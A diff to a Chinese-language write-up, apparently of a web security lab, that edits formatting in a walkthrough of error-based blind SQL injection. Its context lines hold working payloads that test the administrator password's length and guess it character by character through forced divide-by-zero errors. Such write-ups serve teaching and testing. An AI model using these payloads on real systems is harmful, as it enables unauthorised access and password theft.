@@ -357,8 +357,8 @@ jP7Ryk30JRp4JvwD' || (SELECT '')--
 
 接著用以下 SQL 語法測試 password 的長度
 
-- 如果 password 的長度 > 10，就爆炸
-- 如果 password 的長度 <= 10，就正常
+- 如果 password 的長度 `> 10`，就爆炸
+- 如果 password 的長度 `<= 10`，就正常
 
 ```sql
 jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (LENGTH(password) > 10) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a
@@ -383,8 +383,8 @@ jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (LENGTH(password) = 20) THEN TO_CHAR(1/0
 
 再用以下 SQL 語法爆破 password 的每個字元
 
-- 如果 password 第一個字元 > 'm'，就爆炸
-- 如果 password 第一個字元 <= 'm'，就正常
+- 如果 password 第一個字元 `> 'm'`，就爆炸
+- 如果 password 第一個字元 `<= 'm'`，就正常
 
 ```sql
 jP7Ryk30JRp4JvwD' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a
